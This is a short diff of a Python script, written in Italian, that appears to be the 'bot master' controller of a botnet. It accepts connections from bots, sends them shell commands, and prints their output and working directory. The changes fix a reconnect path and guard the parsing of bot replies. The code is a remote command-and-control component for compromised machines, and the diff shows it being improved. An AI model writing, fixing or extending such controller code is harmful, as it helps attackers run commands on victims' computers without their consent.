@@ -41,6 +41,7 @@ def ricevi_messaggio():
         connectionSocket, addr = serverSocket.accept()
         print ("Messaggio non ricevuto, bot master connesso ad un bot con indirizzo" + str(addr))
         cwd = ricevi_messaggio()
+        return ""
         
 def menu():
     print("\nScegliere l'operazione da eseguire:\n"
@@ -68,7 +69,9 @@ while True:
                 if cmd.lower() != "exit":
                     if (not(invia_messaggio(f"6<sep>{cmd}"))): break
                     output = ricevi_messaggio()
-                    queryRes, cwd = output.split('<sep>')
+                    risultato = output.split('<sep>')
+                    if (len(risultato)==2): queryRes, cwd = output.split('<sep>')
+                    else: queryRes = "Errore"
                     print(queryRes + "\n")
         else:
             invia_messaggio(comando)
